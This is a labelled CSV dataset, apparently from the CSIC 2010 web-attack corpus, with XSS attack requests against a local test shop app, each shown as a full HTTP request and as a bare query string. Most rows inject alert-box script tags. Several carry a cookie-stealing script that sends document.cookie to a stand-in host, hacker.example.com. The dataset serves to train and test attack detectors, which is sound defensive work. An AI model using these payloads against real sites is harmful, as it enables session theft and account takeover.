payload,label,source
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=edlin4&password=5oy6nte&nombre=Ralston&apellidos=Pe%F1afiel&email=valente.oray%40enlapalma.com.sh&dni=91076650P&direccion=Publicista+Jose+Alegria+156+&ciudad=Alhambra&cp=09109&provincia=Cuenca&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7C28807C2C9F619C5ABE014ED0381E23 Connection: close",xss,csic_2010
modo=registro&login=edlin4&password=5oy6nte&nombre=Ralston&apellidos=Pe%F1afiel&email=valente.oray%40enlapalma.com.sh&dni=91076650P&direccion=Publicista+Jose+Alegria+156+&ciudad=Alhambra&cp=09109&provincia=Cuenca&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=crIn%2BAda&nombre=Aliberta&apellidos=Gochez&email=kubler5%40porqueagel.ps&dni=49372725M&direccion=Calle+Barrio+De+La+Torre+163%2C+&ciudad=Alar+del+Rey&cp=22770&provincia=Toledo&ntc=5546440906293369&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=C963EC0738372616693003E32AC4FC9F Connection: close",xss,csic_2010
modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=crIn%2BAda&nombre=Aliberta&apellidos=Gochez&email=kubler5%40porqueagel.ps&dni=49372725M&direccion=Calle+Barrio+De+La+Torre+163%2C+&ciudad=Alar+del+Rey&cp=22770&provincia=Toledo&ntc=5546440906293369&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=maurice&password=a5l3ndi1&nombre=Daner&apellidos=Olivos+Ball%FAs&email=cassini-igawa%40alcantarapartners.es&dni=56405919Y&direccion=Practicante+Cristobal++Benitez+160%2C+11%3FC&ciudad=San+Juan+del+Puerto&cp=49148&provincia=Zaragoza&ntc=9851892046707743%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=AE2D26A0AA16BADA60ACCB73453A3613 Connection: close",xss,csic_2010
modo=registro&login=maurice&password=a5l3ndi1&nombre=Daner&apellidos=Olivos+Ball%FAs&email=cassini-igawa%40alcantarapartners.es&dni=56405919Y&direccion=Practicante+Cristobal++Benitez+160%2C+11%3FC&ciudad=San+Juan+del+Puerto&cp=49148&provincia=Zaragoza&ntc=9851892046707743%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3C387DC7EF57EE6B87A07591813E9516 Connection: close",xss,csic_2010
errorMsg=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sabadash&password=gurullada&nombre=Sergio&apellidos=Dinardi+Compres&email=wences.seigner%40aldufa.es&dni=92012174F&direccion=Valldemosa%2C+129+4H&ciudad=Frumales&cp=19490&provincia=Valencia&ntc=5024784015351535%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=30243FC4DC0EE20848C22874E4E4DA85 Connection: close",xss,csic_2010
modo=registro&login=sabadash&password=gurullada&nombre=Sergio&apellidos=Dinardi+Compres&email=wences.seigner%40aldufa.es&dni=92012174F&direccion=Valldemosa%2C+129+4H&ciudad=Frumales&cp=19490&provincia=Valencia&ntc=5024784015351535%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ploof&password=g47d8%F16ador&nombre=Virma&apellidos=Llarden+Romeu&email=bresslau%40altoguadiana.ee&dni=31881769C&direccion=Calle+Picos+De+Europa%2C+65+1%3FH&ciudad=Dehesa+de+Romanos&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Burgos&ntc=6103925352151214&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3DB591EC54658D9EDAC0B2EF2E872F3E Connection: close",xss,csic_2010
modo=registro&login=ploof&password=g47d8%F16ador&nombre=Virma&apellidos=Llarden+Romeu&email=bresslau%40altoguadiana.ee&dni=31881769C&direccion=Calle+Picos+De+Europa%2C+65+1%3FH&ciudad=Dehesa+de+Romanos&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Burgos&ntc=6103925352151214&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=898&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=2ECF2F0D74FF3280CB931B40C44911FD Connection: close",xss,csic_2010
modo=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&precio=898&B1=Confirmar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&pwd=CarMinAR&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=37E0FA66B0D302D93CAF2E90A0B5B74F Connection: close",xss,csic_2010
modo=entrar&login=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&pwd=CarMinAR&remember=on&B1=Entrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=waltdisn&password=AC4iNiA&nombre=Yasmila&apellidos=Monerris+Brau&email=dearden%40hipermadrid.ga&dni=83203700G&direccion=C%2F+Flors%2C+115+&ciudad=Navas+de+Orosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&cp=32782&provincia=Zaragoza&ntc=0851365114838541&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3D246E7BE5E2DA4279F3AFA5D10A0614 Connection: close",xss,csic_2010
modo=registro&login=waltdisn&password=AC4iNiA&nombre=Yasmila&apellidos=Monerris+Brau&email=dearden%40hipermadrid.ga&dni=83203700G&direccion=C%2F+Flors%2C+115+&ciudad=Navas+de+Orosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&cp=32782&provincia=Zaragoza&ntc=0851365114838541&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=6140D838EB6FD7F90F572B3474E8C3D4 Connection: close",xss,csic_2010
id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mathews&pwd=6u1ad5%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&remember=on&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=52717630121CFE097825D232C899131E Connection: close",xss,csic_2010
modo=entrar&login=mathews&pwd=6u1ad5%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&remember=on&B1=Entrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=3C33B5B84859033E53E14DAAAC4EF609 Connection: close",xss,csic_2010
B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&nombre=Vino+Rioja&precio=39&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=921EF873FDD442A6E36BB98D75EED03C Connection: close",xss,csic_2010
id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&nombre=Vino+Rioja&precio=39&cantidad=34&B1=A%F1adir+al+carrito,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Pasar+por+caja HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8E890436079FDB8B270161C1245F6D7F Connection: close",xss,csic_2010
modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Pasar+por+caja,xss,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=533D5428CDABCBC091B63CBB51B9F43A Connection: close",xss,csic_2010
modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio+Bullones&email=radzum_noriega%40alcantarapartners.hr&dni=15508885P&direccion=C%2F+Cadernera%2C+180%2C+5%3FC&ciudad=B%F3veda&cp=06360&provincia=La+Rioja&ntc=3331042207803695sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1a&ntc=7642131917731646&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9B29F82062CAB67967A9A0B78F443BCA Connection: close",xss,csic_2010
modo=registro&login=willy&password=c53p7t25064&nombre=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1a&ntc=7642131917731646&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carolyne&password=1%F35i7am41t0&nombre=Ram%F3n&apellidos=Chambueta+Deben&email=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&dni=10042805Q&direccion=Calle+Falconera%2C+173+&ciudad=Trefacio&cp=31227&provincia=Salamanca&ntc=1976494121699035&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9EC1F2C8E48219862A44B13EF116AB3C Connection: close",xss,csic_2010
modo=registro&login=carolyne&password=1%F35i7am41t0&nombre=Ram%F3n&apellidos=Chambueta+Deben&email=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&dni=10042805Q&direccion=Calle+Falconera%2C+173+&ciudad=Trefacio&cp=31227&provincia=Salamanca&ntc=1976494121699035&B1=Registrar,xss,csic_2010
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=fallows&password=hidrost%E1t.ica&nombre=Florentin&apellidos=Diosdado+Pi%F1eiro&email=jones-davis%40cincocolores.cf&dni=68096192T&direccion=Calle+San+Sebastian+38%2C+&ciudad=Hontecillas&cp=09292&provincia=Burgos&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=DD40ABF626089573C26B938864E6EDC3 Connection: close",xss,csic_2010
modo=registro&login=fallows&password=hidrost%E1t.ica&nombre=Florentin&apellidos=Diosdado+Pi%F1eiro&email=jones-davis%40cincocolores.cf&dni=68096192T&direccion=Calle+San+Sebastian+38%2C+&ciudad=Hontecillas&cp=09292&provincia=Burgos&ntc=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&B1=Registrar,xss,csic_2010
